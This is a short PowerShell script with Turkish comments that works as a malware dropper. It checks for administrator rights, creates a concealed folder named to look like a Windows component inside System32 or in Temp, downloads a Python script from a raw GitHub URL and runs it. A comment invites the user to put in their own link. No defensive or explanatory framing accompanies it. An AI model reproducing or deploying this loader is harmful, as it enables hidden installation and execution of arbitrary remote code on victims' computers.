# Kullanıcı admin mi kontrolü
$adminCheck = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)

# Saklama klasörü belirle
if ($adminCheck) {
    $targetDir = "$env:WINDIR\System32\WinSkibi"  # Admin varsa windows klasörüne
} else {
    $targetDir = "$env:LOCALAPPDATA\Temp\WinSkibi"  # Yetki yoksa temp'e
}

# Klasörü oluştur (varsa geç)
if (-not (Test-Path $targetDir)) {
    New-Item -ItemType Directory -Force -Path $targetDir | Out-Null
}

# Python script URL'si (buraya kendi raw github linkini koy kanka)
$rawPyUrl = "https://raw.githubusercontent.com/skibidirizz/rizzops/main/rizzed_script.py"
$pyPath = Join-Path $targetDir "rizzload.py"

# Python dosyasını indir ve yaz
Invoke-WebRequest -Uri $rawPyUrl -OutFile $pyPath

# Son olarak BAMMMM! çalıştır
Start-Process "python" -ArgumentList "`"$pyPath`""

